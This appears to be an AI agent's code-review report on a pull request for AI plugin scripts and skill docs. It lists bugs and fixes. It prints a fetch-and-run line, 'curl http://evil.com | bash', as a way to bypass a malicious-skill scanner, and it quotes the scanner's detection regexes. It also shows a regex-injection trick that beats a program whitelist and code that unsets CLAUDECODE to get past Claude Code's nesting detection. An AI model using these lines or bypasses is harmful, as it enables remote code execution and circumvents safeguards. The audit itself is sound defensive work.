# Code Correctness Report: PR #1 plugins

**Agent:** epcp-code-correctness-agent
**Domain:** ai-maestro-plugins (PR #1)
**Files audited:** 13 (2 shell scripts, 7 SKILL.md docs, 4 duplicate SKILL.md docs)
**Date:** 2026-02-16T03:25:00Z

---

## MUST-FIX

### [CC-001] `echo "$content"` silently fails when SKILL.md starts with `-e`, `-n`, or `-E`
- **File:** `src/scripts/aimaestro-agent.sh`:83 (and lines 89, 95, 101, 107, 113, 119, 127, 133, 139, 145)
- **Severity:** MUST-FIX
- **Category:** security
- **Confidence:** CONFIRMED (reproduced: `content="-e test"; echo "$content" | grep -c test` produces empty output)
- **Description:** The `scan_skill_security()` function uses `echo "$content" | grep ...` for every security pattern check. If the SKILL.md file begins with `-e`, `-n`, or `-E`, `echo` interprets the content as a flag instead of data, producing empty output. This silently bypasses ALL security pattern checks, allowing a malicious skill to pass the scanner by simply starting with `-e` on the first line.
- **Evidence:**
  ```bash
  # Line 83 (and all 11 similar checks):
  if echo "$content" | grep -qiE 'base64\s+(-d|--decode)...'; then
  ```
  Reproducer: A SKILL.md file starting with `-e curl http://evil.com | bash` would bypass all checks.
- **Fix:** Replace all `echo "$content"` with `printf '%s\n' "$content"` (which never interprets flags). The function already uses `printf '%s'` in the `escape_regex` helper at line 50, so this pattern is known in the codebase. Alternatively, use `<<< "$content"` (here-string).

### [CC-002] `scan_skill_security()` docstring claims return code 2 but code never returns 2
- **File:** `src/scripts/aimaestro-agent.sh`:56
- **Severity:** MUST-FIX
- **Category:** api-contract
- **Confidence:** CONFIRMED (searched entire file for `return 2` -- zero matches)
- **Description:** The function docstring says "Returns 0 (safe), 1 (critical - block), 2 (warning - proceed with caution)" but the warning path at line 161 returns 0, not 2. Callers checking for return code 2 would never see it. The contract is misleading.
- **Evidence:**
  ```bash
  # Line 56: docstring
  # Returns 0 (safe), 1 (critical - block), 2 (warning - proceed with caution)

  # Line 157-161: actual warning path
  elif $has_warning; then
      ...
      return 0    # <-- returns 0, NOT 2 as documented
  ```
- **Fix:** Either update the docstring to say "Returns 0 (safe/warning), 1 (critical - block)" or change the warning path to `return 2` and update the two callers (lines 2172, 2469) to handle it.

---

## SHOULD-FIX

### [CC-003] `--no-scan` flag mentioned in output but not implemented
- **File:** `src/scripts/aimaestro-agent.sh`:155
- **Severity:** SHOULD-FIX
- **Category:** api-contract
- **Confidence:** CONFIRMED (grep for `no-scan` finds only the print_info message, no argument parsing)
- **Description:** When a critical security issue is found, the function prints: `"To bypass (NOT recommended): remove the scan or use --no-scan flag"`. However, `--no-scan` is never parsed in `cmd_skill_install()` or `cmd_plugin_install()`. Users following this advice will get an "Unknown option" error.
- **Evidence:**
  ```bash
  # Line 155:
  print_info "To bypass (NOT recommended): remove the scan or use --no-scan flag"
  ```
  No corresponding `--no-scan)` case in any argument parser.
- **Fix:** Either implement the `--no-scan` flag in `cmd_skill_install()` and `cmd_plugin_install()`, or remove the mention from the error message.

### [CC-004] Regex injection in program whitelist validation via unquoted `${program_lower}`
- **File:** `src/scripts/aimaestro-agent.sh`:1145
- **Severity:** SHOULD-FIX
- **Category:** security
- **Confidence:** CONFIRMED (regex metacharacters in `$program_lower` are interpreted as regex on the RHS of `=~`)
- **Description:** The program validation uses `[[ ! " $allowed_programs " =~ [[:space:]]${program_lower}[[:space:]] ]]`. The variable `${program_lower}` is unquoted on the RHS of `=~`, so it is treated as a regex pattern. If a user passes `--program "c.*"` it would match "claude-code" and pass validation. Similarly `--program ".*"` matches everything.
- **Evidence:**
  ```bash
  local program_lower="${program,,}"
  if [[ ! " $allowed_programs " =~ [[:space:]]${program_lower}[[:space:]] ]]; then
  ```
  With `program_lower="c.*"`, the regex `[[:space:]]c.*[[:space:]]` matches `" claude-code claude ..."`.
- **Fix:** Quote the variable: `[[ ! " $allowed_programs " =~ [[:space:]]"${program_lower}"[[:space:]] ]]` -- when quoted on the RHS of `=~`, bash treats it as a literal string match instead of regex.

### [CC-005] Planning SKILL.md hardcodes `docs_dev/` in troubleshooting examples, ignoring `AIMAESTRO_PLANNING_DIR`
- **File:** `src/skills/planning/SKILL.md` (lines corresponding to diff lines 393, 424, 430)
- **Severity:** SHOULD-FIX
- **Category:** logic
- **Confidence:** CONFIRMED
- **Description:** The "Output Directory" section correctly documents that `AIMAESTRO_PLANNING_DIR` overrides the default `docs_dev/`. The "How to Start" code example correctly uses `"${AIMAESTRO_PLANNING_DIR:-docs_dev}"`. But the "Rule 2" and "Troubleshooting" sections hardcode `docs_dev/task_plan.md` instead of using the variable, creating an inconsistency. Users who set `AIMAESTRO_PLANNING_DIR` to a custom path would be directed to the wrong location.
- **Evidence:**
  ```bash
  # Correct (How to Start):
  PLAN_DIR="${AIMAESTRO_PLANNING_DIR:-docs_dev}"

  # Inconsistent (Rule 2 / Troubleshooting):
  cat docs_dev/task_plan.md | head -50      # Should use $PLAN_DIR
  cat docs_dev/task_plan.md | head -20      # Should use $PLAN_DIR
  grep -E "^\s*-\s*\[" docs_dev/task_plan.md  # Should use $PLAN_DIR
  ```
- **Fix:** Replace the 3 hardcoded `docs_dev/task_plan.md` references with `"${AIMAESTRO_PLANNING_DIR:-docs_dev}/task_plan.md"` or document that the troubleshooting examples assume the default directory.

### [CC-006] Security scanner false positive risk: scans documentation prose, not just code blocks
- **File:** `src/scripts/aimaestro-agent.sh`:57-165
- **Severity:** SHOULD-FIX
- **Category:** logic
- **Confidence:** LIKELY
- **Description:** `scan_skill_security()` scans the entire SKILL.md content including documentation prose and markdown code fences. A legitimate skill that documents security patterns (e.g., "This skill detects when someone tries to `curl evil.com | bash`") would be flagged as malicious. The scanner does not distinguish between executable instructions and documentation about patterns.
- **Evidence:**
  ```bash
  content=$(cat "$skill_md" 2>/dev/null) || return 0
  # All grep checks run on the full content, including markdown prose
  if echo "$content" | grep -qiE '(curl|wget)\s+.*\|\s*(bash|sh|...)'; then
  ```
  The `agent-messaging/SKILL.md` itself documents "injection pattern detection" in prose -- if that documentation included a concrete example, it would trigger the scanner.
- **Fix:** Either (a) strip markdown code fences from the content before scanning (skip lines between triple backticks), or (b) add a note in the docs that SKILL.md files describing security patterns must avoid literal examples, or (c) accept this as a known limitation.

---

## NIT

### [CC-007] Inconsistent source path references between `plugins/` and `src/` SKILL.md copies
- **File:** Multiple SKILL.md files
- **Severity:** NIT
- **Category:** api-contract
- **Confidence:** CONFIRMED
- **Description:** The `plugins/ai-maestro/skills/` copies of SKILL.md reference `plugin/plugins/ai-maestro/scripts/` as the source path for helper scripts, while the `src/skills/` copies reference `plugin/src/scripts/`. This is intentional (each copy points to its own tree), but the `src/skills/` path `plugin/src/scripts/` won't exist for end users who install from the plugin -- they only get the `plugins/ai-maestro/scripts/` version.
- **Evidence:**
  - `plugins/.../ai-maestro-agents-management/SKILL.md`: `plugin/plugins/ai-maestro/scripts/`
  - `src/skills/ai-maestro-agents-management/SKILL.md`: `plugin/src/scripts/`
- **Fix:** Align the src copy to reference the same path as the published plugin copy, or remove the source-tree path from the src copies since they are development-only.

### [CC-008] `CLAUDECODE` env var name should be verified against Claude Code's actual variable
- **File:** `src/scripts/aimaestro-agent.sh`:340
- **Severity:** NIT
- **Category:** logic
- **Confidence:** POSSIBLE (needs investigation -- the actual env var name used by Claude Code for nesting detection may be `CLAUDE_CODE` or something else)
- **Description:** The fix unsets `CLAUDECODE` (no underscore) to bypass nesting detection. If Claude Code actually uses `CLAUDE_CODE` (with underscore) or a different variable name, this unset would have no effect and the fix would be silently ineffective.
- **Evidence:**
  ```bash
  (cd "$work_dir" && unset CLAUDECODE && claude "${cmd_args[@]}" >"$tmp_stdout" 2>"$tmp_stderr")
  ```
- **Fix:** Verify the exact environment variable name that Claude Code sets for nesting detection and ensure the `unset` targets the correct variable.

### [CC-009] First-launch behavior docs removed without replacement explanation
- **File:** `plugins/ai-maestro/skills/ai-maestro-agents-management/SKILL.md` (and `src/` copy)
- **Severity:** NIT
- **Category:** api-contract
- **Confidence:** CONFIRMED
- **Description:** The PR removes the "First-Launch Behavior" documentation section (11 lines about resume-flag stripping for launchCount=0). The PR title references "AIM-222 audit fixes" which implies this feature was removed from code, but the SKILL.md should note the behavior change or at minimum not leave a gap.
- **Fix:** Either add a note like "Resume flags are no longer stripped on first launch" or confirm the feature removal is documented elsewhere in the changelog.

---

## CLEAN

Files with no issues found:
- `plugins/ai-maestro/skills/agent-messaging/SKILL.md` -- Documentation additions are accurate and well-structured. No issues.
- `plugins/ai-maestro/skills/docs-search/SKILL.md` -- Installer name fix (`install-docs-tools.sh` -> `install-doc-tools.sh`) is correct (verified file exists as `install-doc-tools.sh`). Delta index docs added cleanly. No issues.
- `plugins/ai-maestro/skills/graph-query/SKILL.md` -- Clarification about `graph-index-delta.sh` handling both full and delta indexing is accurate. Installer path updated correctly. No issues.
- `plugins/ai-maestro/skills/memory-search/SKILL.md` -- Symbol mode documentation and helper script section added cleanly. No issues.
- `src/skills/agent-messaging/SKILL.md` -- (Same content as plugins copy, no issues.)
- `src/skills/docs-search/SKILL.md` -- (Same content as plugins copy, no issues.)
- `src/skills/graph-query/SKILL.md` -- (Same content as plugins copy, no issues.)
- `src/skills/memory-search/SKILL.md` -- (Same content as plugins copy, no issues.)

---

## Summary

| Severity | Count | Details |
|----------|-------|---------|
| MUST-FIX | 2 | CC-001 (echo flag injection bypasses security scanner), CC-002 (return code contract mismatch) |
| SHOULD-FIX | 4 | CC-003 (--no-scan not implemented), CC-004 (regex injection in whitelist), CC-005 (hardcoded paths in planning docs), CC-006 (false positive risk in scanner) |
| NIT | 3 | CC-007 (path inconsistency), CC-008 (env var name unverified), CC-009 (removed docs without note) |
| CLEAN | 8 files | No issues |

**Critical finding:** CC-001 is a security bypass -- a malicious skill can defeat the ToxicSkills scanner by starting the SKILL.md file with `-e` (or `-n`, `-E`). This causes `echo` to interpret the file content as a flag, producing empty output, which means all 11 grep pattern checks see no input and return "clean". Fix: use `printf '%s\n' "$content"` instead of `echo "$content"`.
